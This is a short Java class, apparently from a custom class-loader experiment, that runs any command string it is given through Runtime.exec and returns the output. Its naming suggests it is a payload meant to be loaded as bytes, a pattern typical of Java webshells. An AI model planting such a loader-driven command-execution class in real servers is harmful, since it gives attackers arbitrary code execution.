package Myclassloader;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Evalforbytes {
    public String as;


    public Evalforbytes(String cmd )throws Exception{
        StringBuilder stringBuilder =  new StringBuilder();
        Process process = Runtime.getRuntime().exec(cmd);

        BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String a ;

        while ((a  = br.readLine() )!= null){
            stringBuilder.append(a).append("\n");
        }
        this.as  = stringBuilder.toString();

//        System.out.println(new Eval(cmd));
    }

    @Override
    public String toString() {
        return this.as;
    }
}
